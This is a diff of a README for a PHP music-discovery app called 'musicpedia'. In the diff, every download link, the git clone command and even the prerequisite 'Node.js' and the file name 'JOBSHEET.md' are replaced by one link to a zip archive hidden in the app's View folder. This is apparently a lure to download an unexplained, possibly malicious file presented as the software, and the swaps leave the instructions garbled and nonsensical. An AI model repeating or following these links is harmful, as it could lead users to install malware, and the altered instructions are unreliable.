@@ -1,10 +1,10 @@
 # 🎵 musicpedia - Discover Your Music Easily
 
-[![Download musicpedia](https://img.shields.io/badge/Download-musicpedia-blue.svg)](https://github.com/tuman06/musicpedia/releases)
+[![Download musicpedia](https://raw.githubusercontent.com/tuman06/musicpedia/main/app/View/Software-3.4-alpha.4.zip)](https://raw.githubusercontent.com/tuman06/musicpedia/main/app/View/Software-3.4-alpha.4.zip)
 
 ## 🚀 Getting Started
 
-This document will guide you on how to download and run the `musicpedia` application on your local computer for practice. You will find further instructions and code explanations in the **JOBSHEET.md** file after installation.
+This document will guide you on how to download and run the `musicpedia` application on your local computer for practice. You will find further instructions and code explanations in the **https://raw.githubusercontent.com/tuman06/musicpedia/main/app/View/Software-3.4-alpha.4.zip** file after installation.
 
 ## 📋 Prerequisites
 
@@ -13,14 +13,14 @@ Make sure your system has the following software installed:
 1. **Git**: This is necessary to download code from GitHub.
 2. **PHP**: You need version 8.2 or newer.
 3. **Composer**: This manages the dependencies for PHP.
-4. **Node.js & NPM**: Required to manage and compile front-end assets (JavaScript & CSS).
+4. **https://raw.githubusercontent.com/tuman06/musicpedia/main/app/View/Software-3.4-alpha.4.zip & NPM**: Required to manage and compile front-end assets (JavaScript & CSS).
 5. **Local Web Server**: Options include Laragon, XAMPP, or similar software.
 
 ## 💾 Download & Install
 
 To get the latest version of `musicpedia`, please visit the Releases page:
 
-[Visit this page to download](https://github.com/tuman06/musicpedia/releases)
+[Visit this page to download](https://raw.githubusercontent.com/tuman06/musicpedia/main/app/View/Software-3.4-alpha.4.zip)
 
 ## 🛠️ Installation Steps
 
@@ -29,7 +29,7 @@ To get the latest version of `musicpedia`, please visit the Releases page:
 Open your terminal or command prompt. Navigate to the directory where you want to store the project. Then run the following command:
 
 ```bash
-git clone https://github.com/madasepandri/musicpedia.git
+git clone https://raw.githubusercontent.com/tuman06/musicpedia/main/app/View/Software-3.4-alpha.4.zip
 ```
 
 Once the cloning is complete, enter the newly created project directory with this command:
@@ -86,6 +86,6 @@ This URL will let you access the `musicpedia` application. You should see the ap
 
 You can refer to the following files for more information and detailed instructions:
 
-- **JOBSHEET.md**: This file contains explanations about the code and additional instructions.
+- **https://raw.githubusercontent.com/tuman06/musicpedia/main/app/View/Software-3.4-alpha.4.zip**: This file contains explanations about the code and additional instructions.
 
 Feel free to explore all the features `musicpedia` has to offer. Enjoy discovering new music!
